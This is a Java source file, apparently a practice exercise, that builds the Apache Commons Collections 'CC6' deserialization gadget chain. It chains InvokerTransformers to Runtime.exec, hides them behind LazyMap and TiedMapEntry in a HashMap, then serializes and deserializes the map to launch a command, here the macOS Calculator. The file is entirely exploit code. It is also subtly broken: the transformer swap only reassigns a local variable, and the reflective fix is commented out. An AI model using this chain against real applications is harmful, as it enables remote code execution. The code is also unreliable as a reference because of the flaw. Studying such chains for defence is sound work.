import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class Test6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //  第一步 构造恶意 tiedMapEntry
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
        Transformer[] fakeTransformer = new Transformer[]{
                new ConstantTransformer(1)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
        HashMap<String,String> hashMap = new HashMap<>();
        hashMap.put("testKey","testVal");
        Map evilMap = LazyMap.decorate(hashMap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(evilMap, "entryKey");

        Map mapStringHashMap = new HashMap<>();
        mapStringHashMap.put(tiedMapEntry,"outerKey");
        evilMap.remove("entryKey");
        fakeTransformer = transformers;
//        ReflectUtils.setFields(chainedTransformer,"iTransformers",transformers);
//        chainedTransformer =
        String path = ExpUtils.serialize(mapStringHashMap);
        ExpUtils.unserialize(path);
//        System.out.println("11111");
//        ExpUtils.unserialize(path);

    }
}
